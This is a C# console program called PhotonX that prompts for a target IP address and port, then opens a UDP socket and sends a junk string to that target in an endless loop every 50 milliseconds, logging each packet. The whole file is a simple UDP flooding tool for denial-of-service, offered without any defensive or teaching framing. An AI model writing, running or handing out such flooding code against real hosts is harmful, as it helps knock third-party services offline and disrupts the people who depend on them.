using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using PhotonX;
using System.Net;
using System.Threading;

namespace PhotonX
{
    class Core
    {
        static void Main(string[] args)
        {
            _Log log = new _Log();
            log.logF<string>("To continue, you must provide the target IP.", false);
            string ip_prompt = Console.ReadLine();

            if(ip_prompt == null)
            {
                log.logF<string>("No ip was entered, exiting...", true);
            } else
            {
                log.logF<string>("Enter the target port", false);
                string port_prompt = Console.ReadLine();

                if (port_prompt == null) { return; }
                else
                {
                    try
                    {
                        var conv = Convert.ToInt32(port_prompt);
                        log.logF<string>($"Starting up PhotonX on: {ip_prompt}:{conv}", false);
                        log.logF<string>($"Creating socket...", false);
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        IPAddress addr = Dns.Resolve(ip_prompt).AddressList[0];
                        log.logF<string>($"[[ {addr} ]]", true);
                        IPEndPoint target = new IPEndPoint(addr, conv);
                        string data = "{}!@#$%^&*()";
                        byte[] buff = Encoding.ASCII.GetBytes(data);
                        while (true)
                        {
                            socket.SendTo(buff, target);
                            log.logF<string>($"sent: {data} to: {target}", true);
                            Thread.Sleep(50);
                        }
                    }
                    catch (Exception ex)
                    {
                        log.logF<string>($"--> {ex}", true);
                        Console.ReadKey();
                    }

                }
            }

        }
    }
}
